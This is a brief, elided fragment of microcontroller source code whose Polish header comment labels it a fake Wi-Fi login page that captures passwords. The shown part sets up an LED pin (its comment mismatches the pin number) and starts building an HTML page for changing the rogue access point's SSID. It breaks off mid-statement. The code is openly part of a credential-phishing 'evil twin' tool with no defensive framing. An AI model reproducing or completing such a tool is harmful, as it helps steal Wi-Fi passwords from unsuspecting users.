// Fałszywa strona logowania do Wi-Fi przechwytująca hasła
...
const byte led_gpio = 4; // LED connected to output 3
...
String ssid() {
  return header("Zmien SSID") + "<p>Tutaj mozesz zmienic nazwe SSID. Po nacisnieciu przycisku „Zmien SSID” utracisz polaczenie, dlatego zrestartuj swoje urządzenie z Fake-WiFi-login-page i ponownie polacz sie z nowym identyfikatorem SSID.</p>" + "<form action=/postSSID method=post><label>Nowa nazwa SSID:</label>" +
